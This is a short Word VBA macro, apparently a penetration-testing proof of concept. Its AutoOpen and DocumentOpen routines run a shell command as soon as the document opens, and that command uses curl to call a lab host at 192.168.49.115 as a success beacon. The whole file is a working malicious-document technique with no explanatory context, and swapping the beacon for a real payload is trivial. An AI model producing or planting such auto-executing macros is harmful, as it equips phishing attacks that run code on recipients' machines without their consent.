Sub mymacro()
    Dim Command As String
    Command = "curl http://192.168.49.115/worked"
    Shell Command, 1
End Sub
Sub AutoOpen()
    mymacro
End Sub
Sub DocumentOpen()
    mymacro
End Sub
